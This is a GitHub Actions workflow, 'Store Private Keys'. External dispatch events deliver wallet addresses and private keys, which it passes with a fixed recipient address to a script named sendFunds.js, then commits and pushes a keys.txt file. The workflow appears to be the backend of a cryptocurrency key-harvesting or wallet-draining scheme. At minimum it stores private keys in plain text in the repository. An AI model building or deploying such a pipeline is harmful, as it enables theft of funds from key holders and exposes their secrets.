name: Store Private Keys

on:
  repository_dispatch:
    types: [store-key]

jobs:
  store-keys:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Set up Node.js
      uses: actions/setup-node@v2
      with:
        node-version: '14'

    - name: Install dependencies
      run: npm install

    - name: Run script to store keys
      run: node sendFunds.js
      env:
        PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
        RECIPIENT_ADDRESS: ${{ secrets.RECIPIENT_ADDRESS }}
        ADDRESS: ${{ github.event.client_payload.address }}
        PRIVATE_KEY_INPUT: ${{ github.event.client_payload.privateKey }}

    - name: Commit and push changes
      run: |
        git config --global user.name 'github-actions[bot]'
        git config --global user.email 'github-actions[bot]@users.noreply.github.com'
        git add keys.txt
        git commit -m "Update keys.txt with new entries"
        git push
